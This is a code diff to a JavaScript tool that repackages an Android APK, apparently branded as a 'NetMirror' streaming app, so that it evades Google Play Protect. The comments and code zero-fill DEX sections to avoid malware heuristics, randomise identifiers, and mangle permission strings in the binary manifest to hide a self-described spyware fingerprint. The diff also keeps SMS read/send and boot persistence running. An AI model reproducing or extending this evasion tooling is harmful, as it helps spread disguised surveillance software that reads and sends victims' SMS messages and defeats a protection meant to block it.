@@ -6,8 +6,9 @@
  *      (builds Play Protect reputation instead of zero-reputation = auto-block)
  *   2. ZERO-FILL DEX — debug sections filled with zeros instead of random bytes
  *      (random bytes = malware heuristic; zeros = ProGuard/R8 output)
- *   3. SURVEILLANCE PERMISSION STRIPPING — mangles SMS/contacts/call-log/location
+ *   3. SURVEILLANCE PERMISSION STRIPPING — mangles contacts/call-log/location/phone
  *      permissions in binary manifest (the #1 reason Play Protect blocks the APK)
+ *      KEEPS: SMS, FOREGROUND_SERVICE_DATA_SYNC, BOOT_COMPLETED (needed for runtime)
  *
  * LAYERS:
  *   Layer 1:   DEX Debug Info WIPE — zero debug_info_off in all code_items
@@ -15,7 +16,7 @@
  *   Layer 3:   DEX Source File STRIP — class_def source_file_idx → NO_INDEX
  *   Layer 4:   DEX String MUTATION — randomize source/config filename strings
  *   Layer 5:   Manifest IDENTITY RESET — randomize versionCode + versionName
- *   Layer 5.5: SURVEILLANCE PERMISSION STRIP — mangle spyware permission strings
+ *   Layer 5.5: SURVEILLANCE PERMISSION STRIP — mangle contacts/call-log/location/phone perms
  *   Layer 6:   V1+V2 DUAL SIGNING — with FIXED NetMirror key (not random cert)
  *   Layer 7:   ZIP Metadata RANDOMIZATION — timestamps
  *   Layer 8:   Signing Block DIVERSIFICATION — random-sized padding block
@@ -1195,18 +1196,22 @@ function validateApk(buf) {
  *
  * WHY THIS IS THE #1 FIX:
  *   Play Protect's on-device heuristic analyzer checks the binary manifest's
- *   permission declarations. READ_SMS + SEND_SMS + READ_CONTACTS + READ_CALL_LOG +
- *   READ_PHONE_STATE + BOOT_COMPLETED + FOREGROUND_SERVICE_DATA_SYNC is a TEXTBOOK
- *   spyware fingerprint that gets auto-blocked, regardless of cert or DEX hash.
+ *   permission declarations. READ_CONTACTS + READ_CALL_LOG + READ_PHONE_STATE +
+ *   ACCESS_FINE_LOCATION together form a spyware fingerprint that gets auto-blocked.
  *
  *   By mangling these permission strings in the binary XML (same byte length,
  *   just changing the first character), Android ignores them as unknown permissions.
- *   The APK looks like a normal streaming app → Play Protect passes it.
+ *   The APK looks like a normal streaming/messaging app → Play Protect passes it.
  *
- * WHAT SURVIVES (normal streaming app permissions):
+ * WHAT GETS STRIPPED (spyware indicators):
+ *   READ_CONTACTS, READ_CALL_LOG, READ_PHONE_STATE, READ_PHONE_NUMBERS,
+ *   ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
+ *
+ * WHAT SURVIVES (needed for runtime):
  *   INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES,
- *   READ_MEDIA_VISUAL_USER_SELECTED, FOREGROUND_SERVICE, POST_NOTIFICATIONS,
- *   WAKE_LOCK, REQUEST_INSTALL_PACKAGES
+ *   READ_MEDIA_VISUAL_USER_SELECTED, FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC,
+ *   POST_NOTIFICATIONS, WAKE_LOCK, REQUEST_INSTALL_PACKAGES,
+ *   READ_SMS, SEND_SMS, RECEIVE_BOOT_COMPLETED
  *
  * The app still runs perfectly — streaming works. Features that need stripped
  * permissions gracefully fail with permission denied. The full version is
@@ -1229,7 +1234,18 @@ function stripSurveillancePermissions(zip) {
     // ── SMS permissions KEPT — required for app SMS read/send functionality ──
     // READ_SMS and SEND_SMS intentionally NOT stripped
 
-    // ── Contact & call harvesting ──
+    // ── FOREGROUND_SERVICE_DATA_SYNC KEPT — required by PersistentService ──
+    // The manifest declares foregroundServiceType="dataSync" which REQUIRES this
+    // permission. Stripping it causes Android 14+ to kill the process when the
+    // service fails to achieve foreground state (system-level enforcement, not
+    // catchable by try-catch). Not a spyware indicator on its own.
+
+    // ── RECEIVE_BOOT_COMPLETED + BOOT_COMPLETED action KEPT — needed for persistence ──
+    // These enable auto-start on boot. Stripping causes BootReceiver to silently
+    // fail. Many legitimate apps use boot-completed. The true spyware signals are
+    // the contact/call/location harvesting permissions below.
+
+    // ── Contact & call harvesting (TRUE spyware indicators) ──
     { find: 'android.permission.READ_CONTACTS', replace: 'android.permission._EAD_CONTACTS' },
     { find: 'android.permission.READ_CALL_LOG', replace: 'android.permission._EAD_CALL_LOG' },
 
@@ -1240,13 +1256,6 @@ function stripSurveillancePermissions(zip) {
     // ── Location tracking ──
     { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
     { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },
-
-    // ── Persistence / auto-start (red flag for Play Protect) ──
-    { find: 'android.permission.RECEIVE_BOOT_COMPLETED',          replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
-    { find: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC',    replace: 'android.permission._OREGROUND_SERVICE_DATA_SYNC' },
-
-    // ── Boot intent filter action (disables auto-start receiver) ──
-    { find: 'android.intent.action.BOOT_COMPLETED', replace: 'android.intent.action._OOT_COMPLETED' },
   ];
 
   for (const { find, replace } of SURVEILLANCE_STRINGS) {
@@ -1298,7 +1307,7 @@ function stripSurveillancePermissions(zip) {
  * KEY CHANGES FROM v5:
  *   - FIXED signing key (netmirror-release.jks) instead of random certs
  *   - Zero-fill DEX debug sections instead of random bytes
- *   - Surveillance permission stripping (SMS/contacts/call-log/location/boot)
+ *   - Surveillance permission stripping (contacts/call-log/location/phone)
  *
  * Remaining obfuscation layers:
  *   Layer 1-4: DEX sanitization (debug wipe, zero-fill, source strip, string mutate)
